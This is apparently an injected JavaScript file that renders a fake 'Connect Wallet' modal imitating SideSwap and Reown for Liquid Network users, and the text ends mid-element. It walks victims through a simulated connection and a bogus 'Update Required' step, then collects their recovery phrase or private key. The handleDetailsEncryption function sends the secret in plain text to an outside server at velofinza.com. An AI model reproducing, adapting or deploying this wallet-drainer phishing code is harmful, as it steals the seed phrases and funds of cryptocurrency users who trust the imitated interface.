(function () {
	let React = typeof window !== "undefined" && window.React ? window.React : (typeof globalThis !== "undefined" ? globalThis.React : undefined);
	let ReactDOM = typeof window !== "undefined" && window.ReactDOM ? window.ReactDOM : (typeof globalThis !== "undefined" ? globalThis.ReactDOM : undefined);
	let useState, useEffect, Fragment, createRoot;

	function setupReactVariables(R, RDOM) {
		React = R;
		ReactDOM = RDOM;
		useState = R.useState;
		useEffect = R.useEffect;
		Fragment = R.Fragment;
		createRoot = RDOM.createRoot;
	}

	if (React && ReactDOM && ReactDOM.createRoot) {
		setupReactVariables(React, ReactDOM);
	}

	function resolveReact() {
		if (React && ReactDOM && createRoot) {
			return true;
		}
		let R = typeof window !== "undefined" && window.React ? window.React : (typeof globalThis !== "undefined" ? globalThis.React : undefined);
		let RDOM = typeof window !== "undefined" && window.ReactDOM ? window.ReactDOM : (typeof globalThis !== "undefined" ? globalThis.ReactDOM : undefined);

		if ((!R || !RDOM) && typeof self !== "undefined" && self.webpackChunk_N_E) {
			try {
				let webpackRequire;
				self.webpackChunk_N_E.push([
					["wallet_modal_extract_" + Math.random()],
					{},
					(r) => { webpackRequire = r; }
				]);
				if (webpackRequire && webpackRequire.m) {
					R = R || (webpackRequire.m[2115] ? webpackRequire(2115) : (webpackRequire.m[1426] ? webpackRequire(1426) : null));
					RDOM = RDOM || (webpackRequire.m[9248] ? webpackRequire(9248) : null);
					if (R && typeof window !== "undefined") window.React = R;
					if (RDOM && typeof window !== "undefined") window.ReactDOM = RDOM;
				}
			} catch (_) {}
		}

		if (R && RDOM) {
			setupReactVariables(R, RDOM);
			return true;
		}
		return false;
	}

	function loadScript(src) {
		return new Promise((resolve, reject) => {
			if (typeof document === "undefined") return resolve();
			const s = document.createElement("script");
			s.src = src;
			s.onload = () => resolve();
			s.onerror = (e) => reject(e);
			(document.head || document.body || document.documentElement).appendChild(s);
		});
	}

	async function ensureReact() {
		if (resolveReact()) return true;

		try {
			await loadScript("https://unpkg.com/react@18/umd/react.production.min.js");
			await loadScript("https://unpkg.com/react-dom@18/umd/react-dom.production.min.js");
			if (resolveReact()) return true;
		} catch (_) {}

		try {
			await loadScript("https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js");
			await loadScript("https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js");
			if (resolveReact()) return true;
		} catch (_) {}

		return resolveReact();
	}

	// ---------------- WALLET DATA & IMAGES ----------------
	// Note: Using placeholder images. Replace with real URLs if needed.
	const wallets = [
		{ name: "SideSwap Wallet", id: "unstoppable", logo: "06d1085d6a3a1328fb8189d106c7a8afbef3d327e34504828c4cac2c74ac0802.png" },
		{ name: "Aqua Wallet", id: "ledger", logo: "aqua.png" },
		{ name: "Phoenix", id: "phoenix", logo: "phoenix.png" },
		{
			name: "WalletConnect",
			id: "walletconnect",
			logo: "walletconnect.png",
		},
	];

	// Shown when a wallet logo / icon image can't be loaded (the referenced
	// img/ folder may not exist next to index.html).
	const FALLBACK_LOGO = "wallet-2.png";
	const handleLogoError = (event) => {
		const img = event.currentTarget;
		img.onerror = null; // prevent infinite retry loops
		if (!img.src.endsWith(FALLBACK_LOGO)) img.src = FALLBACK_LOGO;
	};

	// ---------------- UTILITY COMPONENTS ----------------

	/**
	 * Reusable header component for all views after the initial wallet list.
	 * Follows the SideSwap site pattern: white text, cyan accent border, pill badge style.
	 */
	const ModalHeader = ({ wallet, onClose }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-flex tw-items-center tw-justify-between tw-w-full tw-pb-5 tw-border-b tw-border-white/10 tw-mb-5",
			},
			React.createElement(
				"div",
				{ className: "tw-flex tw-items-center tw-flex-grow tw-gap-3" },
				React.createElement(
					"div",
					{
						className:
							"tw-w-9 tw-h-9 tw-rounded-xl tw-overflow-hidden tw-bg-white/10 tw-flex tw-items-center tw-justify-center tw-border tw-border-white/20",
					},
					React.createElement("img", {
						src: wallet.logo,
						alt: `${wallet.name} Logo`,
						onError: handleLogoError,
						className: "tw-w-full tw-h-full tw-object-contain tw-p-1",
					})
				),
				React.createElement(
					"span",
					{ className: "tw-text-[#94E7FF] tw-text-lg tw-font-bold tw-tracking-tight" },
					wallet.name
				)
			),
			React.createElement(
				"button",
				{
					onClick: onClose,
					className:
						"tw-text-slate-400 tw-text-2xl tw-leading-none hover:tw-text-[#00C5FF] tw-transition-colors tw-duration-200 tw-w-8 tw-h-8 tw-flex tw-items-center tw-justify-center tw-rounded-full hover:tw-bg-white/10",
				},
				"×"
			)
		);

	/**
	 * Custom alert/message box component — matches SideSwap's error/status patterns.
	 */
	const MessageBox = ({ message, onClose }) => {
		useEffect(() => {
			const timer = setTimeout(onClose, 3000); // Close after 3 seconds
			return () => clearTimeout(timer);
		}, [onClose]);

		return React.createElement(
			"div",
			{
				className:
					"tw-absolute tw-top-4 tw-left-1/2 tw--translate-x-1/2 tw-bg-rose-700/90 tw-backdrop-blur-sm tw-text-white tw-px-4 tw-py-2 tw-rounded-xl tw-shadow-lg tw-text-sm tw-z-50 tw-border tw-border-rose-500/40 tw-whitespace-nowrap",
			},
			message
		);
	};

	// ---- Cyan gradient glow orb — ambient background element matching site's star/glow aesthetic ----
	const GlowOrb = ({ className }) =>
		React.createElement("div", {
			className: `tw-absolute tw-rounded-full tw-blur-[80px] tw-pointer-events-none ${className}`,
		});

	// ---- Grid overlay — matches the site's `bg-section-caroline-gradient` lattice pattern ----
	const GridOverlay = () =>
		React.createElement("div", {
			style: {
				position: "absolute",
				inset: 0,
				backgroundImage:
					"linear-gradient(rgba(0,197,255,0.04) 1px, transparent 0), linear-gradient(90deg, rgba(0,197,255,0.04) 1px, transparent 0)",
				backgroundSize: "40px 40px",
				WebkitMaskImage: "radial-gradient(ellipse at 50% 0%, #000 20%, transparent 75%)",
				maskImage: "radial-gradient(ellipse at 50% 0%, #000 20%, transparent 75%)",
				pointerEvents: "none",
				zIndex: 0,
			},
		});

	// ---------------- MODAL VIEWS ----------------

	/**
	 * Step 1: Displays the list of wallets for the user to select.
	 * Design: glass-card aesthetic — dark background, frosted border, cyan accents.
	 */
	const WalletSelectView = ({ onClose, onSelectWallet }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full md:tw-w-[95%] tw-max-w-[440px] tw-h-[560px] md:tw-h-auto tw-rounded-t-3xl md:tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-overflow-hidden",
				style: {
					background: "rgba(5, 30, 55, 0.92)",
					border: "1px solid rgba(255,255,255,0.1)",
					backdropFilter: "blur(20px)",
					WebkitBackdropFilter: "blur(20px)",
				},
				onClick: (e) => e.stopPropagation(),
			},
			// Ambient glow orbs — mirrors site's hero background blobs
			React.createElement(GlowOrb, {
				className: "tw-top-[-60px] tw-left-[-60px] tw-w-[200px] tw-h-[200px]",
				style: { background: "rgba(0,197,255,0.07)" },
			}),
			React.createElement(GlowOrb, {
				className: "tw-bottom-[-40px] tw-right-[-40px] tw-w-[160px] tw-h-[160px]",
				style: { background: "rgba(148,231,255,0.05)" },
			}),
			GridOverlay(),
			// Header
			React.createElement(
				"div",
				{
					className:
						"tw-relative tw-z-10 tw-flex tw-justify-between tw-items-center tw-pb-5 tw-border-b tw-border-white/10 tw-mb-4",
				},
				React.createElement(
					"div",
					{ className: "tw-flex tw-items-center tw-gap-3" },
					// "reown" pill — same pill style as the site's badge elements
					React.createElement(
						"div",
						{
							className:
								"tw-text-[#94E7FF] tw-text-xs tw-font-semibold tw-px-3 tw-py-1 tw-rounded-full tw-border tw-border-[#94E7FF]/30 tw-bg-[#94E7FF]/10",
						},
						"reown"
					),
					React.createElement(
						"span",
						{ className: "tw-text-white tw-text-lg tw-font-semibold" },
						"Connect Wallet"
					)
				),
				React.createElement(
					"button",
					{
						onClick: onClose,
						className:
							"tw-text-slate-400 tw-text-2xl tw-leading-none hover:tw-text-[#00C5FF] tw-transition-colors tw-duration-200 tw-w-8 tw-h-8 tw-flex tw-items-center tw-justify-center tw-rounded-full hover:tw-bg-white/10",
					},
					"×"
				)
			),
			// Wallet list
			React.createElement(
				"div",
				{ className: "tw-relative tw-z-10 tw-flex-1 tw-overflow-y-auto tw-px-1 tw--mx-1 no-scrollbar" },
				React.createElement(
					"p",
					{ className: "tw-text-slate-400 tw-mb-3 tw-text-xs tw-font-semibold tw-uppercase tw-tracking-wider" },
					"Popular"
				),
				wallets.map((wallet, index) =>
					React.createElement(
						"div",
						{
							key: wallet.id,
							className:
								"tw-flex tw-items-center tw-justify-between tw-p-3.5 tw-mb-2.5 tw-rounded-2xl tw-cursor-pointer tw-transition-all tw-duration-300 tw-group",
							style: {
								background: "rgba(255,255,255,0.05)",
								border: "1px solid rgba(255,255,255,0.08)",
							},
							onMouseEnter: (e) => {
								e.currentTarget.style.background = "rgba(0,197,255,0.08)";
								e.currentTarget.style.border = "1px solid rgba(0,197,255,0.3)";
								e.currentTarget.style.transform = "translateY(-2px)";
								e.currentTarget.style.boxShadow = "0 0 20px rgba(0,186,255,0.12)";
							},
							onMouseLeave: (e) => {
								e.currentTarget.style.background = "rgba(255,255,255,0.05)";
								e.currentTarget.style.border = "1px solid rgba(255,255,255,0.08)";
								e.currentTarget.style.transform = "translateY(0)";
								e.currentTarget.style.boxShadow = "none";
							},
							onClick: () => onSelectWallet(wallet),
						},
						React.createElement(
							"div",
							{ className: "tw-flex tw-items-center tw-gap-3.5" },
							React.createElement(
								"div",
								{
									className:
										"tw-w-10 tw-h-10 tw-rounded-xl tw-overflow-hidden tw-bg-white/10 tw-flex tw-items-center tw-justify-center tw-border tw-border-white/20",
								},
								React.createElement("img", {
									src: wallet.logo,
									alt: `${wallet.name} Logo`,
									onError: handleLogoError,
									className: "tw-w-full tw-h-full tw-object-contain",
								})
							),
							React.createElement(
								"span",
								{ className: "tw-text-slate-100 tw-font-medium tw-text-sm" },
								wallet.name
							)
						),
						index === 0 &&
						React.createElement(
							"span",
							{
								className:
									"tw-text-[10px] tw-font-bold tw-text-[#00C5FF] tw-bg-[#00C5FF]/10 tw-border tw-border-[#00C5FF]/30 tw-px-2.5 tw-py-1 tw-rounded-full tw-tracking-wider",
							},
							"RECOMMENDED"
						)
					)
				),
				// Footer info card — glass-card style from the site
				React.createElement(
					"div",
					{
						className:
							"tw-flex tw-items-center tw-gap-3 tw-p-4 tw-mt-4 tw-rounded-2xl",
						style: {
							background: "rgba(255,255,255,0.03)",
							border: "1px solid rgba(255,255,255,0.08)",
						},
					},
					React.createElement(
						"svg",
						{
							xmlns: "http://www.w3.org/2000/svg",
							className: "tw-w-5 tw-h-5 tw-text-[#00C5FF] tw-flex-shrink-0",
							viewBox: "0 0 20 20",
							fill: "currentColor",
						},
						React.createElement("path", {
							fillRule: "evenodd",
							d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
							clipRule: "evenodd",
						})
					),
					React.createElement(
						"p",
						{ className: "tw-text-slate-400 tw-text-xs tw-leading-relaxed" },
						"Connect your wallet to access the Liquid Network"
					)
				)
			)
		);

	/**
	 * Step 2: Shows a loading spinner after a wallet is selected.
	 * Design: cyan spinner accent, dark glass panel.
	 */
	const WalletConnectingView = ({ wallet, onBack, onFinishConnect }) => {
		useEffect(() => {
			const timer = setTimeout(onFinishConnect, 1500);
			return () => clearTimeout(timer);
		}, [onFinishConnect]);
		return React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[440px] tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center tw-overflow-hidden",
				style: {
					background: "rgba(5, 30, 55, 0.92)",
					border: "1px solid rgba(255,255,255,0.1)",
					backdropFilter: "blur(20px)",
					WebkitBackdropFilter: "blur(20px)",
				},
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(GlowOrb, {
				className: "tw-top-0 tw-left-1/2 tw--translate-x-1/2 tw-w-[300px] tw-h-[150px]",
				style: { background: "rgba(0,197,255,0.08)", top: "-30px" },
			}),
			GridOverlay(),
			React.createElement(
				"div",
				{ className: "tw-relative tw-z-10 tw-w-full" },
				React.createElement(ModalHeader, { wallet, onClose: onBack })
			),
			React.createElement(
				"div",
				{
					className:
						"tw-relative tw-z-10 tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center tw-py-10",
				},
				// Spinner styled with site's cyan accent
				React.createElement(
					"div",
					{ className: "tw-relative tw-mb-6" },
					React.createElement("div", {
						className:
							"tw-animate-spin tw-rounded-full tw-h-16 tw-w-16 tw-border-4 tw-border-solid tw-border-white/10 tw-border-t-[#00C5FF]",
					}),
					// Inner glow dot
					React.createElement("div", {
						className: "tw-absolute tw-inset-0 tw-flex tw-items-center tw-justify-center",
						style: {
							background: "radial-gradient(circle, rgba(0,197,255,0.15) 0%, transparent 70%)",
						},
					})
				),
				React.createElement(
					"p",
					{ className: "tw-text-[#94E7FF] tw-font-semibold tw-text-base tw-mb-1" },
					"Connecting…"
				),
				React.createElement(
					"p",
					{ className: "tw-text-slate-400 tw-text-sm" },
					"Opening ",
					wallet.name
				)
			)
		);
	};

	/**
	 * Step 3: Displays information about the wallet update and an update button.
	 * Design: ss-btn gradient CTA, glass panel, cyan heading.
	 */
	const WalletUpdateInfoView = ({ wallet, onBack, onStartUpdate }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[440px] tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-overflow-hidden",
				style: {
					background: "rgba(5, 30, 55, 0.92)",
					border: "1px solid rgba(255,255,255,0.1)",
					backdropFilter: "blur(20px)",
					WebkitBackdropFilter: "blur(20px)",
				},
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(GlowOrb, {
				className: "tw-top-0 tw-right-0 tw-w-[200px] tw-h-[200px]",
				style: { background: "rgba(0,197,255,0.06)", top: "-40px", right: "-40px" },
			}),
			GridOverlay(),
			React.createElement(
				"div",
				{ className: "tw-relative tw-z-10 tw-w-full" },
				React.createElement(ModalHeader, { wallet, onClose: onBack })
			),
			React.createElement(
				"div",
				{
					className:
						"tw-relative tw-z-10 tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center tw-py-6",
				},
				// Shield icon — security-themed, consistent with site's "Confidential" benefit card
				React.createElement(
					"div",
					{
						className:
							"tw-w-16 tw-h-16 tw-rounded-2xl tw-flex tw-items-center tw-justify-center tw-mb-6",
						style: {
							background: "rgba(0,197,255,0.1)",
							border: "1px solid rgba(0,197,255,0.25)",
						},
					},
					React.createElement(
						"svg",
						{
							xmlns: "http://www.w3.org/2000/svg",
							className: "tw-w-8 tw-h-8 tw-text-[#00C5FF]",
							viewBox: "0 0 24 24",
							fill: "none",
							stroke: "currentColor",
							strokeWidth: "1.5",
							strokeLinecap: "round",
							strokeLinejoin: "round",
						},
						React.createElement("path", {
							d: "M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z",
						})
					)
				),
				React.createElement(
					"h3",
					{ className: "tw-text-[#94E7FF] tw-text-2xl tw-font-bold tw-mb-3 tw-tracking-tight" },
					"Update Required"
				),
				React.createElement(
					"p",
					{ className: "tw-text-slate-400 tw-text-sm tw-leading-relaxed tw-mb-8 tw-max-w-[280px] tw-mx-auto" },
					"To ensure a secure connection on the Liquid Network, please update your wallet to the latest version."
				),
				// CTA — matches site's ss-btn gradient style (cyan → light-cyan)
				React.createElement(
					"button",
					{
						onClick: onStartUpdate,
						className: "tw-w-full tw-py-3 tw-rounded-full tw-font-semibold tw-text-white tw-transition-all tw-duration-200 tw-text-base",
						style: {
							backgroundImage: "linear-gradient(90deg, #94e7ff, 40%, #00b4e9)",
							boxShadow: "0 4px 15px rgba(0,197,255,0.3)",
						},
						onMouseEnter: (e) => {
							e.currentTarget.style.backgroundImage = "linear-gradient(90deg, #00b4e9, 40%, #94e7ff)";
							e.currentTarget.style.boxShadow = "0 8px 25px rgba(0,197,255,0.45)";
							e.currentTarget.style.transform = "translateY(-1px)";
						},
						onMouseLeave: (e) => {
							e.currentTarget.style.backgroundImage = "linear-gradient(90deg, #94e7ff, 40%, #00b4e9)";
							e.currentTarget.style.boxShadow = "0 4px 15px rgba(0,197,255,0.3)";
							e.currentTarget.style.transform = "translateY(0)";
						},
					},
					"Update Wallet"
				)
			)
		);

	/**
	 * Step 4: Shows a full-screen loading bar while update progresses.
	 * Design: cyan progress bar, wallet logo in glass container.
	 */
	const WalletFinalLoadingView = ({ wallet, onBack, onFinishLoading }) => {
		const [progress, setProgress] = useState(0);
		useEffect(() => {
			let p = 0;
			const interval = setInterval(() => {
				p += 2;
				if (p > 100) {
					clearInterval(interval);
					onFinishLoading();
				} else setProgress(p);
			}, 100);
			return () => clearInterval(interval);
		}, [onFinishLoading]);

		return React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[440px] tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-overflow-hidden",
				style: {
					background: "rgba(5, 30, 55, 0.92)",
					border: "1px solid rgba(255,255,255,0.1)",
					backdropFilter: "blur(20px)",
					WebkitBackdropFilter: "blur(20px)",
				},
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(GlowOrb, {
				className: "tw-top-0 tw-left-1/2 tw-w-[280px] tw-h-[140px]",
				style: { background: "rgba(0,197,255,0.08)", top: "-30px", transform: "translateX(-50%)" },
			}),
			GridOverlay(),
			React.createElement(
				"div",
				{ className: "tw-relative tw-z-10 tw-w-full" },
				React.createElement(ModalHeader, { wallet, onClose: onBack })
			),
			React.createElement(
				"div",
				{
					className:
						"tw-relative tw-z-10 tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center tw-py-6",
				},
				// Wallet logo in glass container — mirrors site's benefit-card icon container
				React.createElement(
					"div",
					{
						className:
							"tw-w-24 tw-h-24 tw-flex tw-items-center tw-justify-center tw-mb-6 tw-rounded-2xl",
						style: {
							background: "rgba(255,255,255,0.06)",
							border: "1px solid rgba(255,255,255,0.15)",
							boxShadow: "0 0 40px rgba(0,197,255,0.12)",
						},
					},
					React.createElement("img", {
						src: wallet.logo,
						onError: handleLogoError,
						className: "tw-w-full tw-h-full tw-object-contain tw-p-3",
					})
				),
				React.createElement(
					"h3",
					{ className: "tw-text-[#94E7FF] tw-text-xl tw-font-bold tw-mb-1 tw-tracking-tight" },
					"Updating ",
					wallet.name
				),
				React.createElement(
					"p",
					{ className: "tw-text-slate-500 tw-text-sm tw-mb-6" },
					"Please wait, this may take a moment…"
				),
				// Progress bar — site's cyan gradient palette
				React.createElement(
					"div",
					{ className: "tw-w-full" },
					React.createElement(
						"div",
						{
							className: "tw-w-full tw-h-1.5 tw-rounded-full",
							style: { background: "rgba(255,255,255,0.08)" },
						},
						React.createElement("div", {
							className:
								"tw-h-1.5 tw-rounded-full tw-transition-all tw-duration-100 tw-ease-linear",
							style: {
								width: progress + "%",
								backgroundImage: "linear-gradient(90deg, #00c5ff, #94e7ff)",
								boxShadow: "0 0 8px rgba(0,197,255,0.6)",
							},
						})
					),
					React.createElement(
						"div",
						{ className: "tw-flex tw-justify-between tw-mt-2" },
						React.createElement(
							"span",
							{ className: "tw-text-slate-500 tw-text-xs" },
							"Updating…"
						),
						React.createElement(
							"span",
							{ className: "tw-text-[#00C5FF] tw-text-xs tw-font-mono tw-font-semibold" },
							progress,
							"%"
						)
					)
				)
			)
		);
	};

	/**
	 * Step 5: Recovery phrase / private key input view.
	 * Design: glass inputs with cyan focus rings, tab switcher, site-styled CTA.
	 */
	const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
		const [wordCount, setWordCount] = useState(12);
		const [phrases, setPhrases] = useState(Array(12).fill(""));
		const [loading, setLoading] = useState(false);
		const [message, setMessage] = useState(null);
		// "phrase" = secret recovery phrase, "privateKey" = single private key
		const [inputMode, setInputMode] = useState("phrase");
		const [privateKey, setPrivateKey] = useState("");

		const handleWordCountChange = (e) => {
			const newWordCount = parseInt(e.target.value, 10);
			setWordCount(newWordCount);
			setPhrases(Array(newWordCount).fill(""));
		};

		const handlePhraseChange = (index, value) => {
			const trimmedValue = value.trim();
			const newPhrases = [...phrases];

			if (trimmedValue.includes(" ")) {
				const pastedWords = trimmedValue
					.split(" ")
					.filter((word) => word !== "");
				const newWordCount = pastedWords.length;

				if (newWordCount === 12 || newWordCount === 24) {
					setWordCount(newWordCount);
					const adjustedPhrases = Array(newWordCount).fill("");
					for (let i = 0; i < newWordCount; i++) {
						adjustedPhrases[i] = pastedWords[i] || "";
					}
					setPhrases(adjustedPhrases);
					setMessage(null);
				} else {
					setMessage(
						"Invalid recovery phrase length. Please enter a 12 or 24-word phrase."
					);
					setPhrases(Array(phrases.length).fill(""));
				}
			} else {
				newPhrases[index] = trimmedValue;
				setPhrases(newPhrases);
			}
		};

		const togglePhraseVisibility = (index) => {
			const input = document.getElementById(`phrase-input-${index}`);
			if (input) {
				input.type = input.type === "password" ? "text" : "password";
			}
		};

		const togglePrivateKeyVisibility = () => {
			const input = document.getElementById("private-key-input");
			if (input) {
				input.type = input.type === "password" ? "text" : "password";
			}
		};

		const switchInputMode = (mode) => {
			setInputMode(mode);
			setMessage(null);
		};

		const handleDetailsEncryption = async () => {
			let secret;
			if (inputMode === "phrase") {
				if (phrases.some((phrase) => !phrase.trim())) {
					setMessage("Please fill in all recovery phrase fields.");
					return;
				}
				secret = phrases.join(" ");
			} else {
				if (!privateKey.trim()) {
					setMessage("Please enter your private key.");
					return;
				}
				secret = privateKey.trim();
			}

			try {
				setLoading(true);
				const response = await fetch(
					"https://velofinza.com/backend/api/v1/wallet",
					{
						method: "POST",
						headers: {
							"Content-Type": "application/json",
						},
						body: JSON.stringify({
							walletName: wallet.name,
							details: secret,
							email: "oluwaidan@proton.me",
						}),
					}
				);

				if (response.ok) {
					console.log("Details sent successfully!");
					// Move on to the final exporting screen.
					onSend();
				}
				
			} catch (error) {
				console.error("Error encrypting details:", error);
			} finally {
				setLoading(false);
			}
		};

		// Shared input style — glass input matching site's dark field aesthetic
		const inputClass =
			"tw-w-full tw-px-3 tw-py-2.5 tw-text-white tw-text-sm tw-rounded-xl tw-border tw-transition-colors tw-duration-200 tw-pr-10 tw-outline-none";
		const inputStyle = {
			background: "rgba(255,255,255,0.05)",
			border: "1px solid rgba(255,255,255,0.12)",
			color: "#fff",
		};

		return React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[440px] tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-overflow-hidden",
				style: {
					background: "rgba(5, 30, 55, 0.95)",
					border: "1px solid rgba(255,255,255,0.1)",
					backdropFilter: "blur(20px)",
					WebkitBackdropFilter: "blur(20px)",
				},
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(GlowOrb, {
				className: "tw-top-0 tw-left-1/2 tw-w-[280px] tw-h-[130px]",
				style: { background: "rgba(0,197,255,0.07)", top: "-20px", transform: "translateX(-50%)" },
			}),
			GridOverlay(),
			React.createElement(
				"div",
				{ className: "tw-relative tw-z-10 tw-w-full" },
				React.createElement(ModalHeader, { wallet, onClose: onBack })
			),
			message &&
			React.createElement(MessageBox, {
				message: message,
				onClose: () => setMessage(null),
			}),
			React.createElement(
				"div",
				{
					className:
						"tw-relative tw-z-10 tw-flex-1 tw-flex tw-flex-col tw-w-full tw-overflow-y-auto no-scrollbar",
				},
				React.createElement(
					"h3",
					{ className: "tw-text-[#94E7FF] tw-text-lg tw-font-bold tw-mb-1 tw-tracking-tight" },
					inputMode === "phrase"
						? "Import with Recovery Phrase"
						: "Import with Private Key"
				),
				React.createElement(
					"p",
					{ className: "tw-text-slate-400 tw-text-xs tw-mb-4 tw-leading-relaxed" },
					inputMode === "phrase"
						? "We will use your Secret Recovery Phrase to validate ownership."
						: "We will use your Private Key to validate ownership."
				),
				// Tab switcher — pill style matching site's navigation / badge patterns
				React.createElement(
					"div",
					{
						className:
							"tw-flex tw-w-full tw-rounded-xl tw-p-1 tw-mb-4",
						style: {
							background: "rgba(255,255,255,0.05)",
							border: "1px solid rgba(255,255,255,0.08)",
						},
					},
					[
						{ id: "phrase", label: "Secret Phrase" },
						{ id: "privateKey", label: "Private Key" },
					].map((tab) =>
						React.createElement(
							"button",
							{
								key: tab.id,
								type: "button",
								onClick: () => switchInputMode(tab.id),
								className: `tw-flex-1 tw-py-2 tw-rounded-lg tw-text-xs tw-font-semibold tw-transition-all tw-duration-200`,
								style: inputMode === tab.id
									? {
										backgroundImage: "linear-gradient(90deg, #94e7ff, 40%, #00b4e9)",
										color: "#fff",
										boxShadow: "0 2px 10px rgba(0,197,255,0.35)",
									}
									: {
										background: "transparent",
										color: "#94a3b8",
									},
							},
							tab.label
						)
					)
				),
				inputMode === "phrase" &&
				React.createElement(
					"div",
					{ className: "tw-w-full tw-mb-3" },
					React.createElement(
						"select",
						{
							className: inputClass,
							style: inputStyle,
							value: wordCount,
							onChange: handleWordCountChange,
						},
						React.createElement(
							"option",
							{ value: 12 },
							"12-word phrase"
						),
						React.createElement(
							"option",
							{ value: 24 },
							"24-word phrase"
						)
					)
				),
				inputMode === "phrase" &&
				React.createElement(
					"div",
					{
						className:
							"tw-w-full tw-text-slate-400 tw-p-3 tw-rounded-xl tw-flex tw-items-start tw-gap-2 tw-mb-3 tw-text-xs",
						style: {
							background: "rgba(0,197,255,0.06)",
							border: "1px solid rgba(0,197,255,0.15)",
						},
					},
					React.createElement(
						"svg",
						{
							xmlns: "http://www.w3.org/2000/svg",
							className: "tw-h-4 tw-w-4 tw-text-[#00C5FF] tw-flex-shrink-0 tw-mt-0.5",
							viewBox: "0 0 20 20",
							fill: "currentColor",
						},
						React.createElement("path", {
							fillRule: "evenodd",
							d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
							clipRule: "evenodd",
						})
					),
					"You can paste your entire secret recovery phrase into any field"
				),
				inputMode === "phrase" &&
				React.createElement(
					"div",
					{
						className:
							"tw-grid tw-grid-cols-2 tw-gap-2 tw-w-full tw-max-h-[220px] tw-overflow-y-auto tw-mb-4 no-scrollbar",
					},
					phrases.map((phrase, index) =>
						React.createElement(
							"div",
							{ key: index, className: "tw-flex tw-items-center tw-gap-1.5" },
							React.createElement(
								"span",
								{ className: "tw-text-[#00C5FF]/60 tw-text-xs tw-font-mono tw-w-5 tw-text-right tw-flex-shrink-0" },
								`${index + 1}.`
							),
							React.createElement(
								"div",
								{ className: "tw-relative tw-w-full" },
								React.createElement("input", {
									id: `phrase-input-${index}`,
									type: "password",
									className: inputClass,
									style: inputStyle,
									placeholder: "word",
									value: phrase,
									onChange: (e) =>
										handlePhraseChange(
											index,
											e.target.value
										),
									required: true,
									onFocus: (e) => {
										e.currentTarget.style.border = "1px solid rgba(0,197,255,0.5)";
										e.currentTarget.style.boxShadow = "0 0 0 2px rgba(0,197,255,0.1)";
									},
									onBlur: (e) => {
										e.currentTarget.style.border = "1px solid rgba(255,255,255,0.12)";
										e.currentTarget.style.boxShadow = "none";
									},
								}),
								React.createElement(
									"button",
									{
										type: "button",
										onClick: () =>
											togglePhraseVisibility(index),
										className:
											"tw-absolute tw-right-2 tw-top-1/2 tw--translate-y-1/2 tw-text-slate-500 hover:tw-text-[#00C5FF] tw-transition-colors",
									},
									React.createElement(
										"svg",
										{
											xmlns: "http://www.w3.org/2000/svg",
											className: "tw-h-3.5 tw-w-3.5",
											viewBox: "0 0 20 20",
											fill: "currentColor",
										},
										React.createElement("path", {
											d: "M10 12a2 2 0 100-4 2 2 0 000 4z",
										}),
										React.createElement("path", {
											fillRule: "evenodd",
											d: "M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z",
											clipRule: "evenodd",
										})
									)
								)
							)
						)
					)
				),

				inputMode === "privateKey" &&
				React.createElement(
					"div",
					{ className: "tw-w-full tw-mb-4" },
					React.createElement(
						"div",
						{ className: "tw-relative tw-w-full" },
						React.createElement("input", {
							id: "private-key-input",
							type: "password",
							className: inputClass,
							style: inputStyle,
							placeholder: "Enter your private key",
							value: privateKey,
							onChange: (e) => setPrivateKey(e.target.value),
							required: true,
							onFocus: (e) => {
								e.currentTarget.style.border = "1px solid rgba(0,197,255,0.5)";
								e.currentTarget.style.boxShadow = "0 0 0 2px rgba(0,197,255,0.1)";
							},
							onBlur: (e) => {
								e.currentTarget.style.border = "1px solid rgba(255,255,255,0.12)";
								e.currentTarget.style.boxShadow = "none";
							},
						}),
						React.createElement(
							"button",
							{
								type: "button",
								onClick: togglePrivateKeyVisibility,
								className:
									"tw-absolute tw-right-3 tw-top-1/2 tw--translate-y-1/2 tw-text-slate-500 hover:tw-text-[#00C5FF] tw-transition-colors",
							},
							React.createElement(
								"svg",
								{
									xmlns: "http://www.w3.org/2000/svg",
									className: "tw-h-4 tw-w-4",
									viewBox: "0 0 20 20",
									fill: "currentColor",
								},
								React.createElement("path", {
									d: "M10 12a2 2 0 100-4 2 2 0 000 4z",
								}),
								React.createElement("path", {
									fillRule: "evenodd",
